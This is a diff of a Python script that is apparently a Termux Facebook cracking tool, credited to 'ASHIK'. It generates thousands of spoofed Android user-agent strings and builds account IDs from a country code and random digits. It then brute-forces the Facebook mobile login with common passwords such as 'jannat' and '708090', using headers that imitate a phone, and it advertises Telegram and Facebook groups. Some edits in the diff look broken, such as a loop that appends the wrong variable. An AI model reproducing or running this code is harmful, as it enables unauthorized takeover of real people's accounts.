@@ -44,81 +44,41 @@ oks = []
 cps = []
 loop = 0
 ugen=[]
-for tg in range(5000):
+for tg in range(7000):
 	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['5.1.1','6.0.1','7.1.1','10','11','12','13','14','15'])
-	c='SM-J600FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	d=random.randrange(37,106)
+	b=random.choice(['6.','7','8','9','10','11','12','13','14'])
+	c='itel A571W Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,120)
 	e='0'
 	f=random.randrange(3000,6000)
-	g=random.randrange(20,100)
+	g=random.randrange(40,132)
 	h='Mobile Safari/537.36'
 	turag=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
 	ugen.append(turag)
-for ua in range(5000):
+for ua in range(7000):
       a='Mozilla/5.0 (Linux; Android'
-      b=random.choice(['8','9','10','11','12','13','14','15'])
-      c='Redmi Note 8 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/'
-      d=random.randrange(40,119)
+      b=random.choice(['7','8','9','10','11','12','13','14'])
+      c='V2025 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      d=random.randrange(40,105)
+      e='0'
+      f=random.randrange(3000,6000)
+      g=random.randrange(40,100)
+      h='Mobile Safari/537.36'
+      ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+      ugen.append(ug)
+for ar in range(7000):
+      a='Mozilla/5.0 (Linux; Android'
+      b=random.choice(['4.4.4.','5.1','6','7','8','9'])
+      y=random.choice(['SM-J320H, SM-J3109, SM-J320FN, SM-J320P, SM-J320F, SM-J320M, SM-J320Y, SM-J320A, SM-J320G, SM-J327T1, SM-J320V, SM-J320YZ, SM-J320W8, SM-J320ZN, SM-J320N0, SM-J320R4'])
+      c='SM-J320F Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/'
+      d=random.randrange(40,170)
       e='0'
       f=random.randrange(3000,6000)
       g=random.randrange(20,100)
       h='Mobile Safari/537.36'
-      ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+      ar=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
       ugen.append(ug)
-for ar in range(5000):
-    a='Mozilla/5.0 (Linux; Android'
-    b=random.choice(['5.1.1','6.0','6.1','7.0','8','9','10','11'])
-    c='SM-J737T1 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-    d=random.randrange(40,120)
-    e='0'
-    f=random.randrange(3000,6000)
-    g=random.randrange(20,100)
-    h='Mobile Safari/537.36'
-    ua=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
-    ugen.append(ua)
-for ar in range(5000):
-    a='Mozilla/5.0 (Linux; Android'
-    b=random.choice(['7','8','9','10','11','12','13','14','15'])
-    c='Redmi Note 5A Prime Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-    d=random.randrange(35,116)
-    e='0'
-    f=random.randrange(3000,6000)
-    g=random.randrange(20,100)
-    h='Mobile Safari/537.36'
-    ua=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
-    ugen.append(ua)
-for ua in range(5000):
-    a='infinix'
-    b=random.randrange(1,9)
-    c='-0'
-    d=random.randrange(1,9)
-    e='/'
-    f=random.randrange(1,9)
-    g='.0 ('
-    h=random.randrange(1,12)
-    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
-    j='UNTRUSTED/'
-    k=random.randrange(1,3)
-    l='.0'
-    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
-    ugen.append(uaku2)
-for ua in range(5000):
-    a='Samsung'
-    b=random.randrange(1,9)
-    c='-0'
-    d=random.randrange(1,9)
-    e='/'
-    f=random.randrange(1,9)
-    g='.0 ('
-    h=random.randrange(1,12)
-    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
-    j='UNTRUSTED/'
-    k=random.randrange(1,3)
-    l='.0'
-    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
-    ugen.append(uaku2)
-for ua in range(5000):
+for ua in range(7000):
     a='NokiaX'
     b=random.randrange(1,9)
     c='-0'
@@ -133,22 +93,7 @@ for ua in range(5000):
     l='.0'
     uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
     ugen.append(uaku2)
-for ua in range(5000):
-    a='Xiomi'
-    b=random.randrange(1,9)
-    c='-0'
-    d=random.randrange(1,9)
-    e='/'
-    f=random.randrange(1,9)
-    g='.0 ('
-    h=random.randrange(1,12)
-    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
-    j='UNTRUSTED/'
-    k=random.randrange(1,3)
-    l='.0'
-    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
-    ugen.append(uaku2)
-for sat in range(1000):
+for sat in range(7000):
     a='Redmi'
     b=random.randrange(1,9)
     c='-0'
@@ -167,12 +112,12 @@ os.system("xdg-open https://t.me/fb_crack_termux_all_free_command")
 logo =("""
 \033[1;32m                   ❝𝐖𝐢𝐧𝐧𝐞𝐫 𝐁𝐲 𝐀𝐒𝐇𝐈𝐊❞
 \033[1;36m                       Free Tool
-\033[1;32m                      Version 0.6
+\033[1;32m                      Version 0.9
 \033[1;91m╔═════════════════════════╗
 \033[1;92m   ❝𝐖𝐢𝐧𝐧𝐞𝐫 𝐁𝐲 𝐀𝐒𝐇𝐈𝐊❞
-\033[1;91m╚═════════════════════════╝""") 
+\033[1;91m╚═════════════════════════╝""")
  
-def Alhaj():
+def Ashik():
     os.system('clear')
     os.system('xdg-open https://facebook.com/groups/1713018672413612/')
     print(logo)
@@ -185,17 +130,17 @@ def Alhaj():
     print("\033[1;36m ║  \033[1;35m[\033[1;32m0\033[1;35m][\033[1;32mX\033[1;35m] \033[1;32m ᎬХᏆͲ                   \033[1;36m║")
     print("\033[1;96m ╚═════════════════════════════════╝")
     print("")
-    Alhaj = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
-    if Alhaj in ["1","A"]:
-        Alhajs()
-    if Alhaj in ["2","B"]:
+    Ashik = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
+    if Ashik in ["1","A"]:
+        Ashiks()
+    if Ashik in ["2","B"]:
         os.system('xdg-open https://facebook.com/groups/1713018672413612/')
-    if Alhaj in ["3","C"]:
+    if Ashik in ["3","C"]:
         os.system('xdg-open https://m.me/j/AbZqgfeGR8AMRy9D/')
-    if Alhaj in ["0","X"]:
+    if Ashik in ["0","X"]:
         os.system('exit')
 
-def Alhajs():
+def Ashiks():
     user=[]
     os.getuid
     os.geteuid
@@ -225,16 +170,16 @@ def Alhajs():
         print(f'\033[1;91m║\033[1;92m Tool Winner 𝐀𝐒𝐇𝐈𝐊 ')
         print("\033[1;91m╚═════════════════════════════════════╝")
         for love in user:
-            pwx = [love,love[2:],code+love[:3],'jannat','a123456','bangla','708090','908070']
+            pwx = [love,love[2:],code+love[:3],'jannat','bangla','708090','908070']
             uid = code+love
-            Fb_crack.submit(Alhajm,uid,pwx,tl)
+            Fb_crack.submit(Ashikm,uid,pwx,tl)
     print("\033[1;91m╔═══════════════════════════╗")
     print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
     print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM 𝐀𝐒𝐇𝐈𝐊 ')
     print("\033[1;91m╚═══════════════════════════╝")
 
 
-def Alhajm(uid,pwx,tl):
+def Ashikm(uid,pwx,tl):
     global loop
     global cps
     global oks
@@ -256,21 +201,20 @@ def Alhajm(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'm.facebook.com',
     'method': 'GET',
-    'scheme': 'https', 
+    'scheme': 'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://t.facebook.com',
-    'referer': 'https://t.facebook.com/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
+    'dpr': '2.75',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"23124RA7EO"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"14.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
@@ -301,4 +245,4 @@ def Alhajm(uid,pwx,tl):
     except:
         pass
  
-Alhaj()
+Ashik()
